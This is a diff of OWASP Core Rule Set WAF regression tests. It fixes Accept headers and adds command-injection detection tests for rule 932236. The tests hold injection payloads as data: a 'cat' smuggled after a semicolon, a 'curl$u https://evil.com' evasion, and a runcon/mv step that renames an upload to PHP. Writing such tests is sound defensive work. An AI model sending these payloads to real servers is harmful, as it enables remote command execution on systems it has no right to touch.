@@ -1968,7 +1968,7 @@ tests:
           headers:
             User-Agent: "OWASP CRS test agent"
             Host: "localhost"
-            Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,ima>
+            Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
           data: 'arg=;"aaaaaaaaaaaaaaaa"'
           version: "HTTP/1.1"
         output:
@@ -1984,7 +1984,7 @@ tests:
           headers:
             User-Agent: "OWASP CRS test agent"
             Host: "localhost"
-            Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,ima>
+            Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
           data: "arg=;'aaaaaaaaaaaaaaaa'"
           version: "HTTP/1.1"
         output:
@@ -2002,7 +2002,7 @@ tests:
           headers:
             User-Agent: "OWASP CRS test agent"
             Host: "localhost"
-            Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,ima>
+            Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
           data: "arg=;%22The%20quick%20brown%20fox%20jumped%20over%20the%20lazy%20dog%22"
           version: "HTTP/1.1"
         output:
@@ -2020,7 +2020,7 @@ tests:
           headers:
             User-Agent: "OWASP CRS test agent"
             Host: "localhost"
-            Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,ima>
+            Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
           data: "arg=;'The%20quick%20brown%20fox%20jumped%20over%20the%20lazy%20dog'"
           version: "HTTP/1.1"
         output:
@@ -2087,6 +2087,41 @@ tests:
           port: 80
           uri: "/get?r=;runcon+-u+unconfined_u+mv+uploads/index.txt+uploads/index.php"
           version: HTTP/1.1
+        output:
+          log:
+            expect_ids: [932236]
+  - test_id: 117
+    desc: |
+      Detect RCE in last path segment
+      Payload: ;$a cat test.txt
+    stages:
+      - input:
+          dest_addr: "127.0.0.1"
+          method: "GET"
+          port: 80
+          headers:
+            User-Agent: "OWASP CRS test agent"
+            Host: "localhost"
+            Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
+          uri: /path/with/%3B%24a%20cat%20test.txt
+          version: "HTTP/1.1"
+        output:
+          log:
+            expect_ids: [932236]
+  - test_id: 118
+    desc: "Detect command evasions using uninitialized variables `$u`"
+    stages:
+      - input:
+          dest_addr: 127.0.0.1
+          headers:
+            Accept: "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5"
+            Host: localhost
+            User-Agent: "OWASP CRS test agent"
+          method: POST
+          port: 80
+          uri: "/post"
+          version: HTTP/1.1
+          data: "arg=;curl$u https://evil.com"
         output:
           log:
             expect_ids: [932236]
